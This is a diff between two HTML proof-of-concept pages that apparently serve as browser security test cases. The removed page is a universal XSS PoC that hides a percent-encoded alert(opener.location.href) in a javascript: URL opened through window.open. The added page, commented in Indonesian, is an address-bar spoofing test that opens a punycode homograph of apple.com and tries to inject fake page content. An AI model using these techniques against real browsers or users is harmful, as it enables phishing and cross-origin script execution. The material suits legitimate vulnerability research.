@@ -1,17 +1,33 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
-  <head>
-    <meta charset="utf-8">
-    <title>Universal XSS via window.open()</title>
+<html>
+<head>
+    <title>Address Bar Spoofing Testcase</title>
+</head>
+<body>
+    <h2>PoC Address Bar Spoofing</h2>
+    <p>Klik tombol di bawah untuk menguji inkonsistensi parser Omnibox:</p>
+    
+    <button onclick="triggerSpoof()">Jalankan Pengujian</button>
+
     <script>
-      window.open("javascript://google.com/download_your_prize%0A%61%6C%65%72%74%28%6f%70%65%6e%65%72%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%29")
-      window.open("javascript://google.com/download_your_prize%0A%61%6C%65%72%74%28%6f%70%65%6e%65%72%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%29")
-      window.setTimeout(() => {
-        location.href = "https://www.google.com/";
-      }, 0);
-  </script>
-  </head>
-  <body>
-    Dare confirm the pop-up?
-  </body>
+        function triggerSpoof() {
+            // 1. Menentukan URL Target yang memanfaatkan celah parser
+            // Contoh menggunakan domain homograph atau nested scheme yang sedang diteliti
+            var targetUrl = "https://xn--pple-43d.com"; // Unicode: apple.com (tiruan)
+            
+            // 2. Memicu jendela baru atau navigasi cepat
+            var win = window.open(targetUrl, "_blank");
+            
+            // 3. Pada bug tipe race-condition / timing, penyerang biasanya 
+            // memanipulasi dokumen saat status loading belum selesai
+            setTimeout(function() {
+                try {
+                    win.document.body.innerHTML = "<h1>Ini adalah halaman palsu (Spoofed Content)</h1>";
+                } catch(e) {
+                    console.log("Navigasi diblokir oleh Same-Origin Policy jika parser aman.");
+                }
+            }, 100);
+        }
+    </script>
+</body>
 </html>
